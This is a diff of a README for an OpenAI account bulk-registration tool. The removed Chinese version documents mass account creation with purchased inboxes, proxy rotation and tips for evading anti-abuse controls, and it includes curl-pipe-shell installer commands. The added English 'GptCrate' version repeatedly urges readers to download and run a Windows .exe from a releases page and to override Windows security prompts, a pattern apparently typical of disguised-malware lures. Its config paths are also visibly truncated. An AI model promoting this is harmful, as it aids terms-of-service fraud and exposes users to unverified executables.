@@ -1,548 +1,242 @@
-# OpenAI 自动注册工具
+# 🚀 GptCrate - Simple OpenAI Account Setup
 
-> 免责声明
->
-> 本项目仅供学习与技术研究使用，请勿用于任何违反服务条款、法律法规或他人权益的用途。
+[![Download GptCrate](https://img.shields.io/badge/Download-GptCrate-brightgreen?style=for-the-badge)](https://github.com/EngangAman/GptCrate/releases)
 
-自动批量注册 OpenAI 账号，支持多代理轮换、多线程并发。
+## 📥 Download
 
-当前支持 4 种邮箱来源：
+1. Open the [GptCrate Releases page](https://github.com/EngangAman/GptCrate/releases)
+2. Download the latest Windows file from the release list
+3. Save the file to a folder you can find again, such as `Downloads`
+4. If the file comes as a `.zip`, extract it first
+5. If you see an `.exe` file, double-click it to start the app
 
-- `luckmail`：LuckMail API（推荐）
-- `cf`：自建邮箱 / Cloudflare Worker
-- `local_outlook`：本地导入 Outlook 凭据
-- `hotmail007`：Hotmail007 API
+## 🪟 Run on Windows
 
-当前还提供一个 **Web UI（实验版）**：
+1. Download the file from the release page
+2. Open the folder where the file was saved
+3. If Windows shows a security prompt, choose the option that lets you run the file
+4. Start the app by double-clicking the main file
+5. Keep the app in the same folder with its other files
 
-- 入口：`python web_ui.py`
-- 能力：配置切换、任务启动/停止、日志查看、CLIProxyAPI 导入
-- **当前建议优先使用终端版**（`start.py` / `gpt.py`），Web UI 仍在持续改进中
+## ⚙️ What GptCrate Does
 
-终端版已新增 **微软邮箱多别名生成器**：
+GptCrate helps you run a tool that works with OpenAI account setup tasks. It supports:
 
-- 入口 1：`uv run python start.py` 后选择 `微软邮箱多别名生成器`
-- 入口 2：`uv run python alias_generator.py`
-- 支持 `hotmail.*` / `outlook.*` 邮箱
-- 支持保留原字段、打乱输出、可选从源文件移除已处理原邮箱
-- 支持**直接覆盖 `accounts.txt`**（会自动创建 `.bak` 备份）
+- Multiple email sources
+- Proxy rotation
+- Multi-threaded running
+- A terminal version for direct use
+- A web UI for basic control
+- Microsoft mailbox alias generation
 
----
+The app includes these email source modes:
 
-> 默认推荐方案：`LuckMail`
->
-> 这套 README 的快速开始、默认示例和一键启动器都优先按 `LuckMail` 配置。
+- `luckmail` for LuckMail API
+- `cf` for self-hosted email or Cloudflare Worker
+- `local_outlook` for imported Outlook credentials
+- `hotmail007` for Hotmail007 API
 
-## 首页推荐：使用 LuckMail 接码平台
+## 🎯 Recommended Setup
 
-**强烈推荐使用 [LuckMail](https://mails.luckyous.com/EC36F88F) 接码平台！**
+The easiest setup uses `LuckMail`.
 
-- 注册地址：https://mails.luckyous.com/EC36F88F
-- 只需填写 API Key，其他配置代码已帮你搞定！
-- **智能预检测**：自动购买邮箱并检测活跃度，只使用活跃邮箱注册
-- **自动禁用**：不活跃邮箱自动禁用，避免浪费
+You only need to enter an API key. The rest of the settings can stay as they are.
 
-最小配置：
+### Recommended values
 
 ```env
 EMAIL_MODE=luckmail
-LUCKMAIL_API_KEY=你的API密钥
-TOKEN_OUTPUT_DIR=./tokens
+LUCKMAIL_API_KEY=your_api_key
+TOKEN_OUTPUT_DIR=./to
 ```
 
----
+## 🧩 Before You Start
 
-## 代理推荐
+You will need:
 
-**高质量代理服务商，支持免费测试，先充值后付费**
+- A Windows PC
+- Internet access
+- A browser
+- A text editor if you want to change settings
+- A folder with write access, such as `Downloads` or `Desktop`
 
-- 微信: `ytip886`
-- Telegram: `yitong886`
+## 🖥️ Main Ways to Use It
 
-![代理产品](./image.png)
+### Terminal version
 
----
+This is the main way to use the tool.
 
-## 快速开始
+1. Open the program from the downloaded files
+2. Follow the menu on screen
+3. Choose the task you want to run
+4. Enter the required values when asked
+
+### Web UI
+
+The web UI is still being improved.
+
+To open it:
 
 ```bash
-# 1. 安装 uv
-# macOS / Linux
-curl -LsSf https://astral.sh/uv/install.sh | sh
-
-# Windows PowerShell
-powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"
-
-# 2. 创建虚拟环境并安装依赖
-uv sync
-
-# 3. 复制配置模板
-cp .env.example .env
-
-# 4. 编辑 .env，填写 LuckMail API Key
-# LUCKMAIL_API_KEY=你的API密钥
-
-# 5. 运行
-uv run python gpt.py --once
+python web_ui.py
 ```
 
-或使用一键启动器（推荐）：
+It can help you:
 
-```bash
-uv run python start.py
-```
+- Switch configs
+- Start or stop tasks
+- View logs
+- Import CLIProxyAPI data
 
-`start.py` 现已支持：
-- LuckMail
-- 自建邮箱 / Cloudflare Worker
-- 本地 Outlook 导入
-- Hotmail007
+## 📧 Email Source Options
 
-推荐优先用 `start.py` 生成 `.env`，再按需手工微调。
+### 1. LuckMail
 
-如需体验 Web UI（实验版）：
+This is the default choice.
 
-```bash
-uv run python web_ui.py
-```
+Use it when you want a simple setup with fewer steps.
 
-默认地址：
+### 2. CF
 
-```text
-http://127.0.0.1:8765
-```
+Use this if you want to manage email yourself or use a Cloudflare Worker setup.
 
-> 说明：Web UI 目前可用，但交互和导入流程仍在持续打磨；如果你追求稳定性，建议优先使用终端版。
+### 3. local_outlook
 
----
+Use this if you already have Outlook credentials saved on your computer.
 
-## 环境要求
+### 4. hotmail007
 
-- 推荐使用 `uv` 自动管理 Python 版本和虚拟环境
-- 项目内置 `.python-version`，默认使用 Python 3.11
-- 若不用 `uv`，也可以手动准备 Python 3.10+
+Use this if you want to connect through the Hotmail007 API.
 
-### 使用 uv
+## 🔤 Microsoft Alias Generator
 
-```bash
-uv sync
-```
+GptCrate also includes a Microsoft email alias tool.
 
-首次执行会自动创建 `.venv/` 并安装依赖。
+You can start it in one of two ways:
 
-### 手动安装依赖
+1. Run `start.py` and choose `微软邮箱多别名生成器`
+2. Run `alias_generator.py`
 
-```bash
-pip install curl_cffi
-```
+It supports:
 
----
+- `hotmail.*` email addresses
+- `outlook.*` email addresses
+- Keeping the original field
+- Shuffling output
+- Removing processed original emails from the source file
+- Overwriting `accounts.txt`
+- Automatic `.bak` backup before overwrite
 
-## 文件说明
+## 🛠️ Basic Setup Steps
 
-| 文件          | 作用                              |
-| ------------- | --------------------------------- |
-| `gpt.py`      | 主程序                                                     |
-| `start.py`    | 一键启动器（带交互式配置，支持 4 种邮箱模式）              |
-| `alias_generator.py` | 微软邮箱多别名生成器（终端版）                       |
-| `web_ui.py`   | Web UI 启动入口（实验版，本地面板）                        |
-| `.env`        | 配置文件 (邮箱、代理、输出路径等)                          |
-| `accounts.txt`| 输入账号文件；`file`/`local_outlook` 模式会读取它          |
-| `proxies.txt` | 代理列表文件 (每行一个代理)                                |
-| `tokens/`     | 输出目录；成功 token、成功账号密码、压缩包等都在这里       |
+1. Download the latest release from the [Releases page](https://github.com/EngangAman/GptCrate/releases)
+2. Extract the files if needed
+3. Open the folder
+4. Edit the config file if you want to change email mode or API key
+5. Run the main file
+6. Follow the prompts on the screen
 
----
+## 📝 Example Config
 
-## 配置文件 (.env)
-
-### 邮箱模式
-
-支持四种邮箱来源，通过 `EMAIL_MODE` 切换：
-
-| 模式              | 值           | 说明                                                                                        |
-| ----------------- | ------------ | ------------------------------------------------------------------------------------------- |
-| Cloudflare Worker | `cf`         | 使用自有域名随机生成邮箱，需配置 `MAIL_DOMAIN` / `MAIL_WORKER_BASE` / `MAIL_ADMIN_PASSWORD` |
-| 本地 Outlook 导入 | `local_outlook` | 从 `accounts.txt` 读取 `邮箱----密码----client_id----refresh_token`，直接用本地 Outlook 凭据收信 |
-| Hotmail007 API    | `hotmail007` | 通过 API 拉取微软邮箱，需配置 `HOTMAIL007_API_KEY`                                          |
-| **LuckMail API**  | `luckmail`   | **推荐** 智能购买+预检测活跃邮箱，需配置 `LUCKMAIL_API_KEY`                                 |
-
-**Cloudflare 模式配置：**
-
-```env
-EMAIL_MODE=cf
-MAIL_DOMAIN=your-domain.com
-MAIL_WORKER_BASE=https://mail-worker.your-domain.com
-MAIL_ADMIN_PASSWORD=your-password
-```
-
-说明：
-
-- 程序会随机生成 `prefix@MAIL_DOMAIN`
-- 收验证码时访问：
-  - `GET {MAIL_WORKER_BASE}/admin/mails`
-  - `DELETE {MAIL_WORKER_BASE}/admin/mails/{id}`
-- 请求头中使用：
-  - `x-admin-auth: MAIL_ADMIN_PASSWORD`
-
-**本地 Outlook 导入模式配置：**
-
-```env
-EMAIL_MODE=local_outlook
-ACCOUNTS_FILE=accounts.txt
-LOCAL_OUTLOOK_MAIL_MODE=graph
-LOCAL_OUTLOOK_BAD_FILE=bad_local_outlook.txt
-```
-
-`accounts.txt` 每行格式：
-
-```txt
-邮箱----密码----client_id----refresh_token
-```
-
-- `LOCAL_OUTLOOK_MAIL_MODE` 支持 `graph` / `imap`
-- 失效账号会自动写入 `LOCAL_OUTLOOK_BAD_FILE`
-- 程序读取的是**项目根目录**下的 `accounts.txt`
-- 成功注册后写入的是 `tokens/accounts.txt`，两者不是同一个文件
-
-**Hotmail007 模式配置：**
-
-```env
-EMAIL_MODE=hotmail007
-HOTMAIL007_API_URL=https://gapi.hotmail007.com
-HOTMAIL007_API_KEY=你的API密钥
-HOTMAIL007_MAIL_TYPE=outlook-premium
-HOTMAIL007_MAIL_MODE=imap
-```
-
-`HOTMAIL007_MAIL_MODE` 支持 `graph` (Microsoft Graph API) 和 `imap` (IMAP 协议) 两种收信方式。
-
-**LuckMail 模式配置（推荐）：**
+If you use LuckMail, your config can look like this:
 
 ```env
 EMAIL_MODE=luckmail
-LUCKMAIL_API_URL=https://mails.luckyous.com/api/v1/openapi
-LUCKMAIL_API_KEY=你的API密钥
-
-# 邮箱类型: ms_imap (IMAP协议) 或 ms_graph (Microsoft Graph API)
-LUCKMAIL_EMAIL_TYPE=ms_imap
-# 自动购买邮箱并检测活跃度（推荐开启）
-LUCKMAIL_AUTO_BUY=true
-# 只使用已购邮箱
-LUCKMAIL_PURCHASED_ONLY=false
-# 跳过已购邮箱检查，直接买新邮箱
-LUCKMAIL_SKIP_PURCHASED=false
-# 只使用自己导入到 LuckMail 的邮箱（true=只读“我的邮箱”，用完即停）
-LUCKMAIL_OWN_ONLY=false
-# 已购/预检测邮箱活跃度检测并发数
-LUCKMAIL_CHECK_WORKERS=20
-# 调试 LuckMail 收信轮询（建议排查收不到验证码时临时开启）
-LUCKMAIL_MAIL_DEBUG=false
-# 邮箱不活跃时的最大重试次数
-LUCKMAIL_MAX_RETRY=3
+LUCKMAIL_API_KEY=your_api_key_here
+TOKEN_OUTPUT_DIR=./to
 ```
 
-**LuckMail 工作模式说明：**
+If you use another email source, change the mode name to match it.
 
-1. **预检测模式** (`LUCKMAIL_AUTO_BUY=true`)：
-   - 启动时自动创建后台线程
-   - **优先检查已购邮箱**：获取用户已购买的非禁用邮箱，默认只筛选 `@hotmail.com`
-   - 批量购买新邮箱（默认20个）补充号池
-   - **并行检测活跃度**（默认 `20` 线程，可用 `LUCKMAIL_CHECK_WORKERS` 调整）
-   - **检测通过即刻入队**，不必等待整批检测结束
-   - **自动禁用不活跃邮箱**
-   - 注册时直接从队列取活跃邮箱使用
-   - 队列不足时自动补充
+## 📂 Folder Layout
 
-2. **实时购买模式** (`LUCKMAIL_AUTO_BUY=true`，跳过预检测)：
-   - 注册时实时购买邮箱
-   - 购买后立即检测活跃度
-   - 不活跃则禁用并重新购买
+You may see files like these:
 
-3. **接码模式** (`LUCKMAIL_AUTO_BUY=false`)：
-   - 每次注册时创建接码订单
-   - 平台自动分配临时邮箱
-   - 适合快速测试
+- `start.py` for the main menu
+- `gpt.py` for terminal tasks
+- `web_ui.py` for the web UI
+- `alias_generator.py` for alias creation
+- `accounts.txt` for account data
+- `to/` for saved output
+- `.bak` files for backup copies
 
-4. **已购邮箱模式**（推荐已有大量邮箱的用户）：
-   - 只使用用户已购买的邮箱
-   - **当前默认只使用 `@hotmail.com` 的已购邮箱**
-   - 启动时批量检测已购邮箱活跃度，**谁先检测通过谁先入队**
-   - 活跃的加入号池，不活跃的自动禁用
-   - 若首轮没有筛到可用 Hotmail 活跃邮箱，则直接停止，不再空转线程
+## 🔐 Proxy Use
 
-5. **我的邮箱模式**（适合已把 Outlook/Hotmail 导入 LuckMail 的用户）：
-   - 只使用用户在 **“我的邮箱”** 中导入的邮箱
-   - 启动时批量读取状态正常的邮箱并加入号池
-   - 注册时直接从号池取邮箱，并通过对应邮箱邮件列表轮询验证码
-   - 用完后直接停止，不购买新邮箱
+The tool supports proxy rotation.
 
-### 代理配置
+Use proxies when you want to route requests through different network paths.
 
-两种方式二选一：
+A typical setup may include:
+
+- One proxy list file
+- One proxy per task
+- Rotation during batch jobs
+
+## 🧭 Simple First Run
+
+If you are new, use this path:
+
+1. Download the release
+2. Extract the files
+3. Set `EMAIL_MODE=luckmail`
+4. Add your `LUCKMAIL_API_KEY`
+5. Run the main program
+6. Choose the default option in the menu
+7. Check the output folder for results
+
+## 🧪 Common File Types
+
+You may see these file types after download:
+
+- `.exe` for a Windows program
+- `.zip` for a compressed folder
+- `.py` for Python files
+- `.txt` for plain text data
+- `.env` for settings
+
+## 📌 Best Use Path
+
+If you want the fewest steps, use this order:
+
+1. Download the latest release
+2. Use `LuckMail`
+3. Start the main menu with `start.py`
+4. Follow the prompts
+5. Save results in the default output folder
+
+## 🔗 Download Again
+
+If you need the file later, use the same page:
+
+[Go to GptCrate Releases](https://github.com/EngangAman/GptCrate/releases)
+
+## 🖱️ What to Click
+
+When you open the release page, look for:
+
+- The newest version at the top
+- A Windows build or zip file
+- The file name with the latest version number
+- The download asset attached to the release
+
+## 📁 Output Files
+
+The tool saves data to the folder set in:
 
 ```env
-# 方式一：单代理
-PROXY=http://127.0.0.1:7890
-
-# 方式二：代理列表文件 (批量注册时自动轮换)
-PROXY_FILE=proxies.txt
+TOKEN_OUTPUT_DIR=./to
 ```
 
-### 批量注册配置
+You can change this path if you want the files in another folder.
 
-```env
-BATCH_COUNT=10
-BATCH_THREADS=2
-```
+## 🧰 Useful Shortcuts
 
-### 输出路径
+- Use LuckMail for the easiest start
+- Keep the output folder in a place you can find
+- Leave the default values in place if you are unsure
+- Use the terminal version first
+- Use the web UI only if you want a basic browser view
 
-```env
-TOKEN_OUTPUT_DIR=./tokens
-CLI_PROXY_AUTHS_DIR=/path/to/auths
-```
+## 📎 Release Link
 
-- `TOKEN_OUTPUT_DIR` -- Token JSON 文件保存目录
-- 默认值为 `./tokens`，目录不存在时会自动创建
-- `CLI_PROXY_AUTHS_DIR` -- 若配置，注册成功后自动拷贝 token 到该目录并删除本地副本
-
----
-
-## 代理列表文件 (proxies.txt)
-
-每行一个代理地址，空行和 `#` 开头的注释行会被忽略。
-
-```
-# HTTP 代理
-http://127.0.0.1:7890
-http://user:pass@proxy1.com:8080
-
-# SOCKS5 代理
-socks5://127.0.0.1:1080
-socks5://user:pass@proxy2.com:1080
-```
-
-批量注册时会按 **round-robin** 顺序自动轮换使用这些代理。
-
----
-
-## 命令行参数
-
-`uv run python gpt.py [参数]`
-
-| 参数                     | 默认值               | 说明                                        |
-| ------------------------ | -------------------- | ------------------------------------------- |
-| `--proxy`                | 无                   | 单个代理地址                                |
-| `--proxy-file`           | 读 .env `PROXY_FILE` | 代理列表文件路径                            |
-| `--count`                | 无 (无限循环)        | 批量注册数量，注册够了自动停止              |
-| `--threads`              | 1                    | 并发线程数                                  |
-| `--once`                 | -                    | 只运行一次 (等同 `--count 1`)               |
-| `--check`                | -                    | 先检测已有 token 状态，不足阈值时自动补注册 |
-| `--sleep-min`            | 5                    | 每次注册间隔最短秒数                        |
-| `--sleep-max`            | 30                   | 每次注册间隔最长秒数                        |
-| `--email-mode`           | 读 .env              | 邮箱模式: `cf` / `hotmail007` / `luckmail` / `local_outlook` |
-| `--local-outlook-mail-mode` | 读 .env           | 本地 Outlook 收信模式: `graph` / `imap`         |
-| `--hotmail007-key`       | 读 .env              | 覆盖 .env 中的 Hotmail007 API Key           |
-| `--hotmail007-type`      | 读 .env              | 覆盖 .env 中的邮箱类型                      |
-| `--hotmail007-mail-mode` | 读 .env              | 收信模式: `graph` / `imap`                  |
-| `--luckmail-key`         | 读 .env              | 覆盖 .env 中的 LuckMail API Key             |
-
----
-
-## 使用示例
-
-### 1. 单次注册 (直连)
-
-```bash
-uv run python gpt.py --once
-```
-
-### 2. 单代理注册一个
-
-```bash
-uv run python gpt.py --proxy http://127.0.0.1:7890 --once
-```
-
-### 3. 单代理批量注册 10 个
-
-```bash
-uv run python gpt.py --proxy http://127.0.0.1:7890 --count 10
-```
-
-### 4. 多代理轮换 + 批量注册
-
-```bash
-uv run python gpt.py --proxy-file proxies.txt --count 20
-```
-
-### 5. 多代理 + 3 线程并发批量注册
-
-```bash
-uv run python gpt.py --proxy-file proxies.txt --count 20 --threads 3
-```
-
-### 6. 全部配置写在 .env，直接运行
-
-```env
-PROXY_FILE=proxies.txt
-BATCH_COUNT=10
-BATCH_THREADS=2
-```
-
-```bash
-uv run python gpt.py
-```
-
-### 7. 检测已有 token + 自动补注册
-
-```bash
-uv run python gpt.py --check --proxy-file proxies.txt
-```
-
-先扫描 `CLI_PROXY_AUTHS_DIR` 下的 token 文件，刷新过期的、删除无效的，可用数低于阈值 (默认 10) 时自动补注册。
-
-### 8. 无限循环模式 (持续注册)
-
-```bash
-uv run python gpt.py --proxy-file proxies.txt --threads 2
-```
-
-不指定 `--count` 时为无限循环模式，按 `Ctrl+C` 停止。
-
-### 9. 本地 Outlook 导入模式
-
-```env
-EMAIL_MODE=local_outlook
-ACCOUNTS_FILE=accounts.txt
-LOCAL_OUTLOOK_MAIL_MODE=graph
-LOCAL_OUTLOOK_BAD_FILE=bad_local_outlook.txt
-```
-
-```txt
-# accounts.txt
-your@hotmail.com----your_password----client_id----refresh_token
-```
-
-```bash
-uv run python gpt.py --count 1 --threads 1
-```
-
-### 10. 自建邮箱 / Cloudflare Worker 模式
-
-```env
-EMAIL_MODE=cf
-MAIL_DOMAIN=your-domain.com
-MAIL_WORKER_BASE=https://mail-worker.your-domain.com
-MAIL_ADMIN_PASSWORD=your-password
-```
-
-```bash
-uv run python gpt.py --count 1 --threads 1
-```
-
-### 11. 微软邮箱多别名生成器
-
-支持将：
-
-```txt
-email----password----client_id----refresh_token
-```
-
-批量转换为：
-
-```txt
-email+suffix----password----client_id----refresh_token
-```
-
-使用方式：
-
-```bash
-uv run python alias_generator.py --input accounts.txt --per-email 5 --overwrite-accounts
-```
-
-也可以直接：
-
-```bash
-uv run python start.py
-```
-
-然后选择：
-
-```text
-5. 微软邮箱多别名生成器
-```
-
-推荐直接覆盖 `accounts.txt`：
-
-- 生成结果会直接写回 `accounts.txt`
-- 原始输入会自动备份为 `accounts.txt.bak`
-- 后续 `local_outlook` / `file` 模式本来就是从 `accounts.txt` 读取，因此生成后可直接跑注册
-
----
-
-## 输出示例
-
-### 当前终端输出风格
-
-- 顶部彩色配置面板
-- 业务日志按时间顺序输出
-- 实时状态仅在关键节点打印，不再周期性刷屏
-- 结束时输出彩色统计面板
-
-### LuckMail 预检测模式输出（含已购邮箱检测）
-
-```
-[*] 启动预检测后台线程，维护活跃邮箱池...
-[*] 等待预检测线程准备活跃邮箱...
-
-[*] [预检测] 首先检查已购邮箱...
-[*] 获取已购邮箱列表...
-[*] 获取到 50 个已购邮箱，开始检测活跃度...
-[*] 已购邮箱检测完成: ✓活跃 35/50 个, 已禁用 15 个不活跃邮箱
-[*] [预检测] ✓ 已从已购邮箱中添加 35 个活跃邮箱 | 队列: 35 个
-==================================================
-[*] [预检测] 活跃邮箱池不足 (35/10)，批量购买 20 个...
-==================================================
-[*] 批量购买 20 个邮箱 (类型: ms_imap)...
-[*] 成功购买 20 个邮箱，开始并行检测活跃度...
-[*] 检测完成: ✓活跃 3 个, ✗不活跃 17 个(已禁用17个)
-[*] 活跃邮箱列表:
-    ✓ example1@hotmail.com
-    ✓ example2@hotmail.com
-    ✓ example3@hotmail.com
-[*] [预检测] ✓ 已补充 3 个活跃邮箱 | 队列: 38 个
-
-[T1#1] [12:28:05] 开始注册 (代理: http://127.0.0.1:1082)
-[*] 当前 IP 所在地: JP
-[*] ✓ 使用预检测活跃邮箱: example1@hotmail.com
-[*] 活跃邮箱池: 37 个待使用
-...
-```
-
----
-
-## 输出文件
-
-| 文件                        | 说明                                                               |
-| --------------------------- | ------------------------------------------------------------------ |
-| `token_xxx@xxx_时间戳.json` | 注册成功的 Token JSON (含 access_token / refresh_token / email 等) |
-| `accounts.txt`              | 输入账号文件；`file` 或 `local_outlook` 模式会读取它               |
-| `tokens/accounts.txt`       | 所有成功注册的账号密码，格式: `邮箱----密码`                       |
-| `bad_local_outlook.txt`     | 本地 Outlook 模式失效账号记录                                      |
-
----
-
-## 注意事项
-
-1. **代理必须为非 CN/HK 地区的 IP**，否则网络检查会拦截
-2. **多线程数建议不超过代理数量**，避免同一代理并发过多被风控
-3. `Ctrl+C` 可随时优雅中断所有线程
-4. `--sleep-min` / `--sleep-max` 控制注册间隔，防止频率过高
-5. **LuckMail 预检测模式**会优先检测已购邮箱活跃度，再批量购买新邮箱补充号池
-6. **已购邮箱模式**当前默认只筛选 `@hotmail.com`，并把检测通过的邮箱立即加入号池
-7. 可用 `LUCKMAIL_CHECK_WORKERS` 调整已购/预检测活跃度检测并发数（默认 `20`）
-8. 排查 LuckMail 收不到验证码时，可临时开启 `LUCKMAIL_MAIL_DEBUG=true` 查看 `token/mails` 摘要、最近邮件主题与 fallback 状态
-9. `local_outlook` 模式下，`accounts.txt` 读取后会被消费；失效号会追加到 `LOCAL_OUTLOOK_BAD_FILE`
-10. `cf` 模式下如果收不到验证码，优先检查 `MAIL_WORKER_BASE` 是否包含协议（例如 `https://`）以及 `/admin/mails` 是否能返回目标邮箱邮件
-11. Web UI 当前属于**实验版**，建议用于辅助查看与导入；批量注册、稳定运行、问题排查仍推荐优先使用终端版
-12. 多别名生成器当前默认只处理 `@hotmail.*` 和 `@outlook.*`，其他域名会自动跳过
+[Visit the GptCrate release download page](https://github.com/EngangAman/GptCrate/releases)
